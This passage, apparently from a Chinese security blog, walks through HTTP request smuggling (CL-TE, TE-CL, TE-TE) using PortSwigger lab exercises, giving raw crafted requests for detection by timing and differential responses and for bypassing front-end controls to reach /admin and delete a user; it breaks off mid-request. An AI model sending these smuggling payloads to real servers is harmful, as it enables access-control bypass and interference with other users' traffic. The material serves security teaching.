<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">aGET &#x2F; HTTP&#x2F;1.1</span><br><span class="line">HOST: test.com</span><br></pre></td></tr></table></figure>

<p>​    从而实现了一次HTTP请求攻击。</p>
<h3 id="3-3-CL-TE"><a href="#3-3-CL-TE" class="headerlink" title="3.3 CL-TE"></a>3.3 CL-TE</h3><p>​    所谓<code>CL-TE</code>，就是当收到存在两个请求头的请求包时，前端代理服务器只处理<code>Content-Length</code>这一请求头，而后端服务器会遵守<code>RFC2616</code>的规定，忽略掉<code>Content-Length</code>，处理<code>Transfer-Encoding</code>这一请求头。</p>
<p>​    chunk传输数据格式如下，其中size的值由16进制表示。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[chunk size][\r\n][chunk data][\r\n][chunk size][\r\n][chunk data][\r\n][chunk size &#x3D; 0][\r\n][\r\n]</span><br></pre></td></tr></table></figure>

<p>​    Lab 地址：<a href="https://portswigger.net/web-security/request-smuggling/lab-basic-cl-te" target="_blank" rel="noopener">https://portswigger.net/web-security/request-smuggling/lab-basic-cl-te</a></p>
<p>​    构造数据包</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F; HTTP&#x2F;1.1\r\n</span><br><span class="line">Host: ace01fcf1fd05faf80c21f8b00ea006b.web-security-academy.net\r\n</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Macintosh; Intel Mac OS X 10.14; rv:56.0) Gecko&#x2F;20100101 Firefox&#x2F;56.0\r\n</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,*&#x2F;*;q&#x3D;0.8\r\n</span><br><span class="line">Accept-Language: en-US,en;q&#x3D;0.5\r\n</span><br><span class="line">Cookie: session&#x3D;E9m1pnYfbvtMyEnTYSe5eijPDC04EVm3\r\n</span><br><span class="line">Connection: keep-alive\r\n</span><br><span class="line">Content-Length: 6\r\n</span><br><span class="line">Transfer-Encoding: chunked\r\n</span><br><span class="line">\r\n</span><br><span class="line">0\r\n</span><br><span class="line">\r\n</span><br><span class="line">G</span><br></pre></td></tr></table></figure>

<p>​    连续发送几次请求就可以获得该响应。</p>
<p><img src="https://image.3001.net/images/20200716/15949110901703.png" alt="image-20200714222119186"></p>
<p>​    由于前端服务器处理<code>Content-Length</code>，所以这个请求对于它来说是一个完整的请求，请求体的长度为6，也就是</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0\r\n</span><br><span class="line">\r\n</span><br><span class="line">G</span><br></pre></td></tr></table></figure>

<p>​    当请求包经过代理服务器转发给后端服务器时，后端服务器处理<code>Transfer-Encoding</code>，当它读取到<code>0\r\n\r\n</code>时，认为已经读取到结尾了，但是剩下的字母<code>G</code>就被留在了缓冲区中，等待后续请求的到来。当我们重复发送请求后，发送的请求在后端服务器拼接成了类似下面这种请求。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GPOST &#x2F; HTTP&#x2F;1.1\r\n</span><br><span class="line">Host: ace01fcf1fd05faf80c21f8b00ea006b.web-security-academy.net\r\n</span><br><span class="line">......</span><br></pre></td></tr></table></figure>

<p>​    服务器在解析时当然会产生报错了。</p>
<h3 id="3-4-TE-CL"><a href="#3-4-TE-CL" class="headerlink" title="3.4 TE-CL"></a>3.4 TE-CL</h3><p>​    所谓<code>TE-CL</code>，就是当收到存在两个请求头的请求包时，前端代理服务器处理<code>Transfer-Encoding</code>这一请求头，而后端服务器处理<code>Content-Length</code>请求头。</p>
<p>​    Lab地址：<a href="https://portswigger.net/web-security/request-smuggling/lab-basic-te-cl" target="_blank" rel="noopener">https://portswigger.net/web-security/request-smuggling/lab-basic-te-cl</a></p>
<p>​    构造数据包</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F; HTTP&#x2F;1.1\r\n</span><br><span class="line">Host: acf41f441edb9dc9806dca7b00000035.web-security-academy.net\r\n</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Macintosh; Intel Mac OS X 10.14; rv:56.0) Gecko&#x2F;20100101 Firefox&#x2F;56.0\r\n</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,*&#x2F;*;q&#x3D;0.8\r\n</span><br><span class="line">Accept-Language: en-US,en;q&#x3D;0.5\r\n</span><br><span class="line">Cookie: session&#x3D;3Eyiu83ZSygjzgAfyGPn8VdGbKw5ifew\r\n</span><br><span class="line">Content-Length: 4\r\n</span><br><span class="line">Transfer-Encoding: chunked\r\n</span><br><span class="line">\r\n</span><br><span class="line">12\r\n</span><br><span class="line">GPOST &#x2F; HTTP&#x2F;1.1\r\n</span><br><span class="line">\r\n</span><br><span class="line">0\r\n</span><br><span class="line">\r\n</span><br></pre></td></tr></table></figure>

<p><img src="https://image.3001.net/images/20200716/15949110942229.png" alt="image-20200714225318848"></p>
<p>​    由于前端服务器处理<code>Transfer-Encoding</code>，当其读取到<code>0\r\n\r\n</code>时，认为是读取完毕了，此时这个请求对代理服务器来说是一个完整的请求，然后转发给后端服务器，后端服务器处理<code>Content-Length</code>请求头，当它读取完<code>12\r\n</code>之后，就认为这个请求已经结束了，后面的数据就认为是另一个请求了，也就是</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GPOST &#x2F; HTTP&#x2F;1.1\r\n</span><br><span class="line">\r\n</span><br><span class="line">0\r\n</span><br><span class="line">\r\n</span><br></pre></td></tr></table></figure>

<p>成功报错。</p>
<h3 id="3-5-TE-TE"><a href="#3-5-TE-TE" class="headerlink" title="3.5 TE-TE"></a>3.5 TE-TE</h3><p>​    <code>TE-TE</code>，也很容易理解，当收到存在两个请求头的请求包时，前后端服务器都处理<code>Transfer-Encoding</code>请求头，这确实是实现了RFC的标准。不过前后端服务器毕竟不是同一种，这就有了一种方法，我们可以对发送的请求包中的<code>Transfer-Encoding</code>进行某种混淆操作，从而使其中一个服务器不处理<code>Transfer-Encoding</code>请求头。从某种意义上还是<code>CL-TE</code>或者<code>TE-CL</code>。</p>
<p>​    Lab地址：<a href="https://portswigger.net/web-security/request-smuggling/lab-ofuscating-te-header" target="_blank" rel="noopener">https://portswigger.net/web-security/request-smuggling/lab-ofuscating-te-header</a></p>
<p>​    构造数据包</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F; HTTP&#x2F;1.1\r\n</span><br><span class="line">Host: ac4b1fcb1f596028803b11a2007400e4.web-security-academy.net\r\n</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Macintosh; Intel Mac OS X 10.14; rv:56.0) Gecko&#x2F;20100101 Firefox&#x2F;56.0\r\n</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,*&#x2F;*;q&#x3D;0.8\r\n</span><br><span class="line">Accept-Language: en-US,en;q&#x3D;0.5\r\n</span><br><span class="line">Cookie: session&#x3D;Mew4QW7BRxkhk0p1Thny2GiXiZwZdMd8\r\n</span><br><span class="line">Content-length: 4\r\n</span><br><span class="line">Transfer-Encoding: chunked\r\n</span><br><span class="line">Transfer-encoding: cow\r\n</span><br><span class="line">\r\n</span><br><span class="line">5c\r\n</span><br><span class="line">GPOST &#x2F; HTTP&#x2F;1.1\r\n</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded\r\n</span><br><span class="line">Content-Length: 15\r\n</span><br><span class="line">\r\n</span><br><span class="line">x&#x3D;1\r\n</span><br><span class="line">0\r\n</span><br><span class="line">\r\n</span><br></pre></td></tr></table></figure>

<p><img src="https://image.3001.net/images/20200716/15949111003969.png" alt="image-20200714233446131"></p>
<p>​    需要<code>\r\n\r\n</code>在后面加上尾随序列<code>0</code>。</p>
<h2 id="4、查找HTTP请求走私漏洞"><a href="#4、查找HTTP请求走私漏洞" class="headerlink" title="4、查找HTTP请求走私漏洞"></a>4、查找HTTP请求走私漏洞</h2><h3 id="4-1-使用计时技术查找HTTP请求走私漏洞"><a href="#4-1-使用计时技术查找HTTP请求走私漏洞" class="headerlink" title="4.1 使用计时技术查找HTTP请求走私漏洞"></a>4.1 使用计时技术查找HTTP请求走私漏洞</h3><p>​    检测HTTP请求走私漏洞的最普遍有效方法是发送请求，如果存在漏洞，该请求将导致应用程序响应中的时间延迟。</p>
<h4 id="4-1-1-使用计时技术查找CL-TE漏洞"><a href="#4-1-1-使用计时技术查找CL-TE漏洞" class="headerlink" title="4.1.1 使用计时技术查找CL.TE漏洞"></a>4.1.1 使用计时技术查找CL.TE漏洞</h4><p>​    如果应用程序容易受到请求走私的CL.TE变体的攻击，则发送如下所示的请求通常会导致时间延迟：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: vulnerable-website.com</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line">Content-Length: 4</span><br><span class="line"></span><br><span class="line">1</span><br><span class="line">A</span><br><span class="line">X</span><br></pre></td></tr></table></figure>

<p>​    由于前端服务器使用<code>Content-Length</code>标头，因此它将仅转发此请求的一部分，而忽略<code>X</code>。后端服务器使用<code>Transfer-Encoding</code>标头，处理第一个块，然后等待下一个块到达。这将导致明显的时间延迟。</p>
<h4 id="4-1-2-使用计时技术查找TE-CL漏洞"><a href="#4-1-2-使用计时技术查找TE-CL漏洞" class="headerlink" title="4.1.2 使用计时技术查找TE.CL漏洞"></a>4.1.2 使用计时技术查找TE.CL漏洞</h4><p>​    如果应用程序容易受到TE.CL变种的请求走私攻击，则发送如下所示的请求通常会导致时间延迟：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: vulnerable-website.com</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line">Content-Length: 6</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">X</span><br></pre></td></tr></table></figure>

<p>​    由于前端服务器使用<code>Transfer-Encoding</code>标头，因此它将仅转发此请求的一部分，而忽略<code>X</code>。后端服务器使用<code>Content-Length</code>标头，期望消息正文中有更多内容，然后等待其余内容到达。这将导致明显的时间延迟。</p>
<blockquote>
<p>​    如果应用程序容易受到该漏洞的CL.TE变体的攻击，则基于时间的TE.CL漏洞测试可能会破坏其他应用程序用户。因此，要隐身并最大程度地减少中断，您应该首先使用CL.TE测试，只有在第一个测试失败的情况下才继续进行TE.CL测试。</p>
</blockquote>
<h3 id="4-2-使用差异响应确认HTTP请求走私漏洞"><a href="#4-2-使用差异响应确认HTTP请求走私漏洞" class="headerlink" title="4.2 使用差异响应确认HTTP请求走私漏洞"></a>4.2 使用差异响应确认HTTP请求走私漏洞</h3><p>​    当检测到可能的请求走私漏洞时，您可以利用此漏洞触发应用程序响应内容的差异来获取该漏洞的进一步证据。这涉及快速连续地向应用程序发送两个请求：</p>
<ul>
<li>一种“攻击”请求，旨在干扰下一个请求的处理。</li>
<li>“正常”请求。</li>
</ul>
<h4 id="4-2-1-使用差异响应确认CL-TE漏洞"><a href="#4-2-1-使用差异响应确认CL-TE漏洞" class="headerlink" title="4.2.1 使用差异响应确认CL.TE漏洞"></a>4.2.1 使用差异响应确认CL.TE漏洞</h4><p>​    要确认CL.TE漏洞，您将发送如下攻击请求：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;search HTTP&#x2F;1.1</span><br><span class="line">Host: vulnerable-website.com</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 50</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">e</span><br><span class="line">q&#x3D;smuggling&amp;x&#x3D;</span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">GET &#x2F;404 HTTP&#x2F;1.1</span><br><span class="line">Foo: x</span><br></pre></td></tr></table></figure>

<p>​    如果攻击成功，则后端服务器会将此请求的最后两行视为属于接收到的下一个请求。这将导致随后的“正常”请求如下所示：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GET &#x2F;404 HTTP&#x2F;1.1</span><br><span class="line">Foo: xPOST &#x2F;search HTTP&#x2F;1.1</span><br><span class="line">Host: vulnerable-website.com</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 11</span><br><span class="line"></span><br><span class="line">q&#x3D;smuggling</span><br></pre></td></tr></table></figure>

<p>​    由于此请求现在包含无效的URL，因此服务器将以状态代码404进行响应，指示攻击请求确实确实对其进行了干扰。</p>
<p>​    Lab地址：<a href="https://portswigger.net/web-security/request-smuggling/finding/lab-confirming-cl-te-via-differential-responses" target="_blank" rel="noopener">https://portswigger.net/web-security/request-smuggling/finding/lab-confirming-cl-te-via-differential-responses</a></p>
<p>​    构造数据包：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: ac201f6c1fc9901e8087240700e3006a.web-security-academy.net</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:66.0) Gecko&#x2F;20100101 Firefox&#x2F;66.0</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: session&#x3D;Jcr7wr0rAtPCIePHi3MpPtKYvXX6Oe3p</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Length: 35</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">GET &#x2F;404 HTTP&#x2F;1.1</span><br><span class="line">X-Ignore: X</span><br></pre></td></tr></table></figure>

<p><img src="https://image.3001.net/images/20200716/15949111075880.png" alt="image-20200715110310018"></p>
<h4 id="4-2-2-使用差分响应确认TE-CL漏洞"><a href="#4-2-2-使用差分响应确认TE-CL漏洞" class="headerlink" title="4.2.2 使用差分响应确认TE.CL漏洞"></a>4.2.2 使用差分响应确认TE.CL漏洞</h4><p>​    要确认TE.CL漏洞，您将发送如下攻击请求（需要<code>\r\n\r\n</code>在final 后面加上尾随序列<code>0</code>）：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;search HTTP&#x2F;1.1</span><br><span class="line">Host: vulnerable-website.com</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 4</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">7c</span><br><span class="line">GET &#x2F;404 HTTP&#x2F;1.1</span><br><span class="line">Host: vulnerable-website.com</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 144</span><br><span class="line"></span><br><span class="line">x&#x3D;</span><br><span class="line">0</span><br></pre></td></tr></table></figure>

<p>​    如果攻击成功，则<code>GET /404</code>后端服务器将从开始将所有内容视为属于接收到的下一个请求。这将导致随后的“正常”请求如下所示：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GET &#x2F;404 HTTP&#x2F;1.1</span><br><span class="line">Host: vulnerable-website.com</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 146</span><br><span class="line"></span><br><span class="line">x&#x3D;</span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">POST &#x2F;search HTTP&#x2F;1.1</span><br><span class="line">Host: vulnerable-website.com</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 11</span><br><span class="line"></span><br><span class="line">q&#x3D;smuggling</span><br></pre></td></tr></table></figure>

<p>​    由于此请求现在包含无效的URL，因此服务器将以状态代码404进行响应，指示攻击请求确实确实对其进行了干扰。</p>
<p>​    Lab地址：<a href="https://portswigger.net/web-security/request-smuggling/finding/lab-confirming-te-cl-via-differential-responses" target="_blank" rel="noopener">https://portswigger.net/web-security/request-smuggling/finding/lab-confirming-te-cl-via-differential-responses</a></p>
<p>​    构造数据包：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: acd31fc11fdb90f980e526ce00b800a5.web-security-academy.net</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:66.0) Gecko&#x2F;20100101 Firefox&#x2F;66.0</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: session&#x3D;cGzs96HQw7tftthKo6AmNVgZ1wwj7PoH</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-length: 4</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">5e</span><br><span class="line">POST &#x2F;404 HTTP&#x2F;1.1</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 15</span><br><span class="line"></span><br><span class="line">x&#x3D;1</span><br><span class="line">0</span><br></pre></td></tr></table></figure>

<p><img src="https://image.3001.net/images/20200716/15949111144125.png" alt="image-20200715112252499"></p>
<h3 id="4-3-注意"><a href="#4-3-注意" class="headerlink" title="4.3 注意"></a>4.3 注意</h3><p>​    在尝试通过干扰其他请求来确认请求走私漏洞时，应牢记一些重要的注意事项：</p>
<ul>
<li>应使用不同的网络连接将“攻击”请求和“正常”请求发送到服务器。通过同一连接发送两个请求都不会证明该漏洞存在。</li>
<li>“攻击”请求和“正常”请求应尽可能使用相同的URL和参数名称。这是因为许多现代应用程序根据URL和参数将前端请求路由到不同的后端服务器。使用相同的URL和参数会增加由同一后端服务器处理请求的机会，这对于进行攻击至关重要。</li>
<li>在测试“正常”请求以检测来自“攻击”请求的任何干扰时，您正在与应用程序同时接收到的任何其他请求（包括来自其他用户的请求）竞争。您应该在“攻击”请求之后立即发送“正常”请求。如果应用程序忙，则可能需要执行多次尝试以确认漏洞。</li>
<li>在某些应用程序中，前端服务器用作负载平衡器，并根据某些负载平衡算法将请求转发到不同的后端系统。如果将您的“攻击”和“正常”请求转发到不同的后端系统，则攻击将失败。这是为什么您可能需要多次尝试才能确认漏洞的另一个原因。</li>
<li>如果您的攻击成功干扰了后续请求，但这不是您发送来检测干扰的“正常”请求，则意味着另一个应用程序用户受到了您的攻击的影响。如果继续执行测试，可能会对其他用户造成破坏性影响，因此应谨慎行事。</li>
</ul>
<h2 id="5、利用HTTP请求走私漏洞"><a href="#5、利用HTTP请求走私漏洞" class="headerlink" title="5、利用HTTP请求走私漏洞"></a>5、利用HTTP请求走私漏洞</h2><h3 id="5-1使用HTTP请求走私绕过前端安全控制"><a href="#5-1使用HTTP请求走私绕过前端安全控制" class="headerlink" title="5.1使用HTTP请求走私绕过前端安全控制"></a>5.1使用HTTP请求走私绕过前端安全控制</h3><p>​    在某些应用程序中，前端Web服务器用于实现某些安全控制，以决定是否允许处理单个请求。允许的请求将转发到后端服务器，在该服务器中，它们被视为已通过前端控件传递。</p>
<p>​    例如，假设应用程序使用前端服务器实施访问控制限制，则仅在授权用户访问请求的URL的情况下才转发请求。然后，后端服务器将接受每个请求，而无需进一步检查。在这种情况下，可以通过将请求走私到受限URL 来使用HTTP请求走私漏洞来绕过访问控制。</p>
<p>​    假设当前用户被允许访问，<code>/home</code>但不允许<code>/admin</code>。他们可以使用以下请求走私攻击来绕过此限制：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;home HTTP&#x2F;1.1</span><br><span class="line">Host: vulnerable-website.com</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 60</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">GET &#x2F;admin HTTP&#x2F;1.1</span><br><span class="line">Host: vulnerable-website.com</span><br><span class="line">Foo: xGET &#x2F;home HTTP&#x2F;1.1</span><br><span class="line">Host: vulnerable-website.com</span><br></pre></td></tr></table></figure>

<p>​    前端服务器在这里看到两个请求，都针对<code>/home</code>，因此这些请求将转发到后端服务器。但是，后端服务器看到一个请求<code>/home</code>和一个请求<code>/admin</code>。它假定（一如既往）请求已通过前端控件传递，因此授予对受限URL的访问权限。</p>
<h4 id="5-1-1-利用HTTP请求走私绕过前端安全控制，CL-TE漏洞"><a href="#5-1-1-利用HTTP请求走私绕过前端安全控制，CL-TE漏洞" class="headerlink" title="5.1.1 利用HTTP请求走私绕过前端安全控制，CL.TE漏洞"></a>5.1.1 利用HTTP请求走私绕过前端安全控制，CL.TE漏洞</h4><p>​    Lab地址：<a href="https://portswigger.net/web-security/request-smuggling/exploiting/lab-bypass-front-end-controls-cl-te" target="_blank" rel="noopener">https://portswigger.net/web-security/request-smuggling/exploiting/lab-bypass-front-end-controls-cl-te</a></p>
<p>​    构造数据包：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: ac3c1f3b1f789b7b80b20a1500f20052.web-security-academy.net</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:66.0) Gecko&#x2F;20100101 Firefox&#x2F;66.0</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: session&#x3D;1CH4IssbB55hFE9To7S50UmSzwFXCZul</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Length: 32</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">GET &#x2F;admin HTTP&#x2F;1.1</span><br><span class="line">Foo: x</span><br></pre></td></tr></table></figure>

<p><img src="https://image.3001.net/images/20200716/1594911120149.png" alt="image-20200715115814697"></p>
<p>​    由于<code>/admin</code>没有使用对的标头，请求被拒绝。加上<code>Host: localhost</code>重新构造：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: ac241f861f25fb0e80b8452c0020001c.web-security-academy.net</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:66.0) Gecko&#x2F;20100101 Firefox&#x2F;66.0</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: session&#x3D;gFcF7Hes3TMAxiyPHeKk8jNTEN9WCyAg</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Length: 53</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">GET &#x2F;admin HTTP&#x2F;1.1</span><br><span class="line">Host: localhost</span><br><span class="line">Foo: x</span><br></pre></td></tr></table></figure>

<p><img src="https://image.3001.net/images/20200716/15949111253436.png" alt="image-20200715141257824"></p>
<p>​    发送两次请求之后可以访问到<code>/admin</code>界面了，但是参考解析里面说到第二次：</p>
<blockquote>
<p>观察到由于第二个请求的Host标头与第一个请求中的走私Host标头冲突，该请求被阻止。两次发出以下请求，以便将第二个请求的标头附加到走私的请求正文中：</p>
</blockquote>
<blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: your-lab-id.web-security-academy.net</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 116</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">GET &#x2F;admin HTTP&#x2F;1.1</span><br><span class="line">Host: localhost</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 10</span><br><span class="line"></span><br><span class="line">x&#x3D;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
</blockquote>
<p>​    通过上面的构造可以访问到管理面板。不知道为什么我加了个Host就可以成功了，有点玄学。可以访问<code>/admin</code>之后可以查看到删除用户的请求api。通过构造：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: your-lab-id.web-security-academy.net</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 139</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">GET &#x2F;admin&#x2F;delete?username&#x3D;carlos HTTP&#x2F;1.1</span><br><span class="line">Host: localhost</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 10</span><br><span class="line"></span><br><span class="line">x&#x3D;</span><br></pre></td></tr></table></figure>

<p><img src="https://image.3001.net/images/20200716/15949111296612.png" alt="image-20200715145849761"></p>
<p>​    删除成功自动跳转到<code>/admin</code>?再次查看<code>/admin</code>里面的用户。发现确实被删除了。</p>
<h4 id="5-1-2-利用HTTP请求走私绕过前端安全控制，TE-CL漏洞"><a href="#5-1-2-利用HTTP请求走私绕过前端安全控制，TE-CL漏洞" class="headerlink" title="5.1.2 利用HTTP请求走私绕过前端安全控制，TE.CL漏洞"></a>5.1.2 利用HTTP请求走私绕过前端安全控制，TE.CL漏洞</h4><p>​    Lab地址：<a href="https://portswigger.net/web-security/request-smuggling/exploiting/lab-bypass-front-end-controls-te-cl" target="_blank" rel="noopener">https://portswigger.net/web-security/request-smuggling/exploiting/lab-bypass-front-end-controls-te-cl</a></p>
<p>​    同理上个实验，构造数据包，需要<code>\r\n\r\n</code>在后面加上尾随序列<code>0</code>：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: ac3a1fae1e6af8dc808e11f800b3006a.web-security-academy.net</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:66.0) Gecko&#x2F;20100101 Firefox&#x2F;66.0</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: session&#x3D;D0lB6HQGL0w9onv0dX9xPFQZgSLJDGGe</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-length: 4</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">71</span><br><span class="line">POST &#x2F;admin HTTP&#x2F;1.1</span><br><span class="line">Host: localhost</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 15</span><br><span class="line"></span><br><span class="line">x&#x3D;1</span><br><span class="line">0</span><br></pre></td></tr></table></figure>

<p><img src="https://image.3001.net/images/20200716/15949111342521.png" alt="image-20200715155343460"></p>
<p>​    访问到<code>/admin</code>界面，之后用http走私进行删除用户操作，构造数据包:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: ac3a1fae1e6af8dc808e11f800b3006a.web-security-academy.net</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:66.0) Gecko&#x2F;20100101 Firefox&#x2F;66.0</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: session&#x3D;D0lB6HQGL0w9onv0dX9xPFQZgSLJDGGe</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-length: 4</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">87</span><br><span class="line">GET 